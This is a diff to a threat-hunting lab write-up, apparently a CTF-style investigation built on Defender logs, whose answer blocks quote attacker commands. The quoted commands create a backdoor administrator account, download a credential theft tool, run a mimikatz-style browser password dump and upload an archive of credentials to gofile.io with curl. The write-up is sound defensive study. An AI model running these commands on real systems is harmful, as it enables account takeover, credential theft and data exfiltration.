@@ -419,7 +419,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B8.png)
 
-Question: Identify the named pipe created by the C2 implant?
+*Question: Identify the named pipe created by the C2 implant?*
 
 ```
 \Device\NamedPipe\msf-pipe-5902
@@ -503,7 +503,7 @@ Decoded message using Cyberchef
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B9a.png)
 
-Question: What is the decoded Base64 command?
+*Question: What is the decoded Base64 command?*
 
 ```
 net user yuki.tanaka2 B@ckd00r2024! /add
@@ -528,7 +528,7 @@ In the decoded message, an account was created
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B9a.png)
 
-Question: Identify the backdoor account name?
+*Question: Identify the backdoor account name?*
 
 ```
 yuki.tanaka2
@@ -568,7 +568,7 @@ The message was decoded using CyberChef
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B11b.png)
 
-Question: What is the decoded Base64 command for privilege escalation?
+*Question: What is the decoded Base64 command for privilege escalation?*
 
 ```
 net localgroup Administrators yuki.tanaka2 /add
@@ -643,7 +643,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B12.png)
 
-Question: What command was used to enumerate RDP sessions?
+*Question: What command was used to enumerate RDP sessions?*
 
 ```
 qwinsta
@@ -716,7 +716,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B13.png)
 
-Question: Identify the command used to enumerate domain trusts?
+*Question: Identify the command used to enumerate domain trusts?*
 
 ```
 "nltest.exe" /domain_trusts /all_trusts
@@ -804,7 +804,7 @@ Result:
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B14.png)
 
 
-Question: What command was used to enumerate network connections?
+*Question: What command was used to enumerate network connections?*
 
 ```
 netstat -ano
@@ -933,7 +933,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B15b.png)
 
-Question: What command was used to search for password databases?
+*Question: What command was used to search for password databases?*
 
 ```
 where /r C:\Users *.kdbx
@@ -1019,7 +1019,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B16b.png)
 
-Question: Identify the discovered password file?
+*Question: Identify the discovered password file?*
 
 ```
 OLD-Passwords.txt
@@ -1105,7 +1105,6 @@ DeviceProcessEvents
 **Technique:** Living off the Land Binaries and Scripts  
 **Technique ID:** T1218  
 
-
 ### Data Source
 - Microsoft Defender for Endpoint
 - `DeviceProcessEvents`
@@ -1127,7 +1126,7 @@ Result
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B17b.png)
 
-Question: Identify the data staging directory?
+*Question: Identify the data staging directory?*
 
 ```
 C:\ProgramData\Microsoft\Crypto\staging
@@ -1151,7 +1150,7 @@ Result
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B18.png)
 
-Question: Identify the command used to copy banking documents?
+*Question: Identify the command used to copy banking documents?*
 
 ```
 "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP
@@ -1238,7 +1237,7 @@ Results:
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B19a.png)
 
 
-Question: Identify the total number of archives created?
+*Question: Identify the total number of archives created?*
 
 ```
 8
@@ -1336,7 +1335,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B20.png)
 
-Question: What command was used to download the credential theft tool?
+*Question: What command was used to download the credential theft tool?*
 
 ```
 curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z
@@ -1433,7 +1432,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B21.png)
 
-Question: What command was used for browser credential theft?
+*Question: What command was used for browser credential theft?*
 
 ```
 "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
@@ -1524,7 +1523,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B22.png)
 
-Question: Identify the command used to exfiltrate the first archive?
+*Question: Identify the command used to exfiltrate the first archive?*
 
 ```
 "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile
@@ -1552,7 +1551,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B23.png)
 
-Question: Identify the exfiltration service domain?
+*Question: Identify the exfiltration service domain?*
 
 ```
 gofile.io
@@ -1627,9 +1626,6 @@ DeviceNetworkEvents
 **Technique:** Living off the Land Binaries and Scripts  
 **Technique ID:** T1218  
 
-### Description
-This detection identifies network connections from an administrative workstation to a public file-sharing service (`gofile`) initiated via `curl` during a remote session. Adversaries commonly abuse legitimate web services and native tools to exfiltrate data or communicate with command-and-control infrastructure while blending in with normal traffic.
-
 ### Data Source
 - Microsoft Defender for Endpoint
 - `DeviceNetworkEvents`
@@ -1648,7 +1644,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B24.png)
 
-Question: Identify the exfiltration server IP address?
+*Question: Identify the exfiltration server IP address?*
 
 ```
 45.112.123.227
@@ -1740,7 +1736,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B25.png)
 
-Question: What file contains the extracted master password?
+*Question: What file contains the extracted master password?*
 
 ```
 KeePass-Master-Password.txt
